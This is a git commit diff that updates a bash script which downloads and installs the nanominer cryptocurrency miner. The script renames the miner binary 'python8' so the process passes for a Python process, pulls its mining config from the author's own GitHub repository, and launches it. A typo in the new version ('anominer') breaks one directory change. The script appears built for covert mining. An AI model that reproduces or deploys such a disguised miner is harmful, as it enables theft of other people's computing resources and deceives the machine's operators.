2971f8ccba0dc57eb244431c67ab0a2513d8400f
haidanglx <40859600+haidanglx@users.noreply.github.com>
2020-02-12 15:18:12 +0700

    Update request.sh

--- request.sh
+++ request.sh
@@ -1,6 +1,6 @@
 #! /bin/bash
 set -x #echo on
-if [ -f ${PWD}/nanominer-linux-1.6.2.tar.gz ]; then
+if [ -f ${PWD}/nanominer-linux-1.8.0.tar.gz ]; then
     if pgrep -x "python8" > /dev/null
 then
     echo "scrip dang chay roi , ke cmn di "
@@ -8,16 +8,16 @@ then
 else
 
 echo "script da install , chay thoi "
-cd nanominer-linux-1.6.2
+cd anominer-linux-1.8.0
 ./python8
      
 fi
 exit
 fi
 
-wget https://github.com/nanopool/nanominer/releases/download/v1.6.2/nanominer-linux-1.6.2.tar.gz
-tar xvzf nanominer-linux-1.6.2.tar.gz
-cd nanominer-linux-1.6.2
+wget https://github.com/nanopool/nanominer/releases/download/v1.8.0/nanominer-linux-1.8.0.tar.gz
+tar xvzf nanominer-linux-1.8.0.tar.gz
+cd nanominer-linux-1.8.0
 mv nanominer python8
 rm config.ini
 wget https://raw.githubusercontent.com/haidanglx/Tonghop/master/config.ini
